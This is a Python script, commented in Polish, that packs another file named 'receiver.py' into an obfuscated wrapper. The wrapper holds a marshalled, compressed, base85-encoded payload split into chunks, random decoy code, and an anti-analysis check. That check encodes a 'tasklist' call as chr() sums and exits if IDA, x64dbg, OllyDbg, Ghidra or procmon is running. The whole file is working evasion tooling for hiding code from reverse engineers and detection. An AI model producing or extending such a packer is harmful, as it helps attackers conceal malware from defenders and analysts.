#!/usr/bin/env python3
"""
Generator zobfuskowanego kodu receiver.py
"""
import base64, zlib, marshal, os, random, string

def random_name(length=8):
    return '_' + ''.join(random.choices(string.ascii_lowercase + '_', k=length))

def encode_string(s):
    return ' + '.join(f'chr({ord(c)})' for c in s)

def obfuscate_source(source_code):
    code_obj = compile(source_code, '<module>', 'exec')
    marshalled = marshal.dumps(code_obj)
    compressed = zlib.compress(marshalled, 9)
    encoded = base64.b85encode(compressed)
    return encoded.decode('ascii')

def generate_decoy_code():
    decoys = []
    decoys.append(f"""
class {random_name(10)}:
    __{random_name(6)} = [{', '.join(str(random.randint(0,255)) for _ in range(16))}]
    def {random_name(8)}(self, {random_name(4)}=None):
        _{random_name(5)} = bytearray({random.randint(64,256)})
        for _i in range({random.randint(8,32)}):
            _{random_name(5)}[_i] = (_i * {random.randint(2,17)}) & 0xFF
        return bytes(_{random_name(5)})
""")
    decoys.append(f"""
_{random_name(8)} = [
    {', '.join(hex(random.randint(0, 0xFF)) for _ in range(32))}
]
_{random_name(8)} = bytes([{', '.join(str(random.randint(0,255)) for _ in range(16))}])
""")
    decoys.append(f"""
_{random_name(6)} = {{
    {', '.join(f'chr({random.randint(65,90)})*{random.randint(2,5)}: {random.randint(0,1000)}' for _ in range(5))}
}}
""")
    return '\n'.join(decoys)

def build_wrapper(encoded_payload):
    chunk_size = 76
    chunks = [encoded_payload[i:i+chunk_size] for i in range(0, len(encoded_payload), chunk_size)]
    chunk_vars = [random_name(12) for _ in chunks]
    payload_var = random_name(10)
    decode_func = random_name(8)
    exec_func = random_name(8)

    lines = []
    lines.append("# -*- coding: utf-8 -*-")
    lines.append("import base64 as _b64, zlib as _zl, marshal as _ml, types as _tp, sys as _sy, os as _os")
    lines.append("")

    anti_debug = random_name(6)
    lines.append(f"def {anti_debug}():")
    lines.append(f"    _bl = [{','.join(encode_string(s) for s in ['ida','x64dbg','ollydbg','ghidra','procmon','debugger'])}]")
    lines.append("    try:")
    lines.append("        _t = _os.popen(chr(116)+chr(97)+chr(115)+chr(107)+chr(108)+chr(105)+chr(115)+chr(116)+chr(32)+chr(47)+chr(70)+chr(79)+chr(32)+chr(67)+chr(83)+chr(86)+chr(32)+chr(47)+chr(78)+chr(72)+chr(32)+chr(50)+chr(62)+chr(110)+chr(117)+chr(108)).read().lower()")
    lines.append("        for _b in _bl:")
    lines.append("            if _b in _t: _os._exit(1)")
    lines.append("    except: pass")
    lines.append(f"{anti_debug}()")
    lines.append("")

    lines.append(generate_decoy_code())

    for var, chunk in zip(chunk_vars, chunks):
        lines.append(f"{var} = '{chunk}'")

    lines.append("")
    lines.append(f"{payload_var} = ''.join([{','.join(chunk_vars)}])")
    lines.append("")

    lines.append(f"def {decode_func}(_d):")
    lines.append(f"    _b = _b64.b85decode(_d)")
    lines.append(f"    _b = _zl.decompress(_b)")
    lines.append(f"    return _ml.loads(_b)")
    lines.append("")

    lines.append(f"def {exec_func}():")
    lines.append(f"    _c = {decode_func}({payload_var})")
    lines.append(f"    exec(_c)")
    lines.append("")
    lines.append(f"if __name__ == {encode_string('__main__')}:")
    lines.append(f"    {exec_func}()")

    return '\n'.join(lines)

def main():
    source_path = os.path.join(os.path.dirname(__file__), 'receiver.py')

    with open(source_path, 'r') as f:
        source = f.read()

    print("[*] Kompilacja i kodowanie payloadu receiver...")
    encoded = obfuscate_source(source)
    print(f"[*] Rozmiar zakodowanego payloadu: {len(encoded)} bajtow")

    print("[*] Generowanie wrappera z obfuskacja...")
    wrapper = build_wrapper(encoded)

    output_path = os.path.join(os.path.dirname(__file__), 'receiver_final.py')
    with open(output_path, 'w') as f:
        f.write(wrapper)

    print(f"[+] Zapisano zobfuskowany plik: {output_path}")
    print(f"[*] Rozmiar: {os.path.getsize(output_path)} bajtow")

if __name__ == '__main__':
    main()
